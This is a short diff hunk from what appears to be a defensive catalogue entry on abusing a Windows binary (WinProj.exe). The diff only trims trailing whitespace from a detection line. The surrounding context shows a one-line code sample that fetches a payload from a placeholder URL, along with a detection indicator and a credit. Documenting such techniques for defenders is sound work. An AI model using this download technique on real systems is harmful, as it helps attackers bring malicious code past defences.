@@ -27,7 +27,7 @@ Full_Path:
 Code_Sample:
   - Code: WinProj.exe https://example.com/payload
 Detection:
-  - IOC: Suspicious Office application internet/network traffic 
+  - IOC: Suspicious Office application internet/network traffic
 Acknowledgement:
   - Person: Avihay Eldad
     Handle: https://twitter.com/avihayeldad
